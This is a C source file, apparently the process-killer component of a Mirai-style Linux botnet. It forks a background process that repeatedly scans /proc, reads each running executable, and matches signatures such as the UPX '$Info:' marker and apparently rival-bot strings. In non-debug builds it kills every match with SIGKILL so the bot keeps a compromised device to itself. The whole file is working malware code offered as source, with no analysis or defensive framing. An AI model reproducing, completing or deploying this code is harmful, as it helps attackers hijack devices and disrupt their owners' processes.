#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#include "headers/main.h"
#include "headers/killer.h"
#include "headers/debug.h"
#include "headers/utils.h"
#include "headers/encryption.h"

int killer_pid;

static char *read_line(int fd, char *buffer, int buffer_size){
	int p = 0, x = 0;
	
	memset(buffer, 0, buffer_size);

	while(TRUE){
		x = read(fd, buffer + p, 1);
		if(x == 0)
			break;
		if(buffer[p] == '\r' || buffer[p] == '\n')
			break;
		p++;
	}
	if(!x)
		return NULL;
	return buffer;
}

static void d(int val, char *buf, int len, int base){
	int s = val, i = 0, x = 0;

	while(TRUE){
		if(!s && i == len)
			break;
		x = s % base;
		s /= base;
		if(x < 10){
			buf[i++] = 48 + x;
			continue;
		}
		buf[i++] = 65 + x - 10;
	}
	buf[i] = 0;
	return;
}

char compare_val(char *buf, int buf_len, char *data, int data_len){
    int i = 0, j = 0;

    for(i = 0; i < buf_len; i++){
        if(j == data_len)
            break;
        if(buf[i] == data[j]){
            j++;
            continue;
        }
        j = 0;
    }
    if(j != data_len)
        return 0;
    return 1;
}

static char kill_by_exe(char *path){
    int fd = -1, ret = 0;
    char buf[4096];
    char f = FALSE;

    if((fd = open(path, O_RDONLY)) == -1)
        return f;
    ret = read(fd, buf, sizeof(buf));
    if(ret < 1){
        close(fd);
        return f;
    }

    if(compare_val(buf, ret, "$Info:", 6) ||
        compare_val(buf, ret, "S[kA", 4) ||
        compare_val(buf, ret, "CAk[S", 5)){
        f = TRUE;
    }

    close(fd);
    return f;
}

void init_killer(){
	int i, len = 0, cur_pid = START_PID;
	char path[4096];
	uint32_t last_scan = 0;

	killer_pid = fork();

	if(killer_pid > 0 || killer_pid == 1)
		return;

	last_scan = time(NULL);

	len = readlink("/proc/self/exe", path, 4096 - 1);
	if(len == -1)
		exit(0);
	path[len] = 0;

	DEBUG_PRINT("detected running out of \"%s\"!\n", path);

	sleep(1);

	DEBUG_PRINT("initialized pid scan\n");

	while(TRUE){
		struct dirent *dir;
		DIR *d;

		if(!(d = opendir("/proc/")))
			break;

		while((dir = readdir(d)) != NULL){
            char maps_buf[64], rp_buf[64], exe_buf[64];
            char status_buf[512];
            int pid = 0, rp_len = 0;

            if(*(dir->d_name) < '0' || *(dir->d_name) > '9')
                continue;

			pid = atoi(dir->d_name);
            if(pid <= cur_pid){
                if(time(NULL) - last_scan > SCAN_RESET_TIME - 1){
                    cur_pid = START_PID;
                    continue;
                }
                continue;
            }

            cur_pid = pid;
            last_scan = time(NULL);

            memset(status_buf, 0, sizeof(status_buf));
            memset(maps_buf, 0, sizeof(maps_buf));
            memset(exe_buf, 0, sizeof(exe_buf));

            strcpy(exe_buf, "/proc/");
            strcat(exe_buf, dir->d_name);
            strcat(exe_buf, "/exe");


            DEBUG_PRINT("scanning pid: \"%d\"\n", pid);

            if (pid == getpid() || pid == getppid()){
                DEBUG_PRINT("found our pid and skipping it \"%d\"\n", pid);
                continue;
            }else{

                if(kill_by_exe(exe_buf)){
                    #ifdef DEBUG
                    DEBUG_PRINT("found killable pid: \"%s\" (exe_killer)\n", exe_buf);
                    #else
                    kill(pid, SIGKILL);
                    #endif
                }
            } 
            
            usleep(5000);
		}
        sleep(1);
        closedir(d);
	}
    DEBUG_PRINT("pid scan finished\n");
    exit(0);
}

void terminate_killer_process(void){
    if(killer_pid != 0)
        kill(killer_pid, SIGKILL);
    return;
}
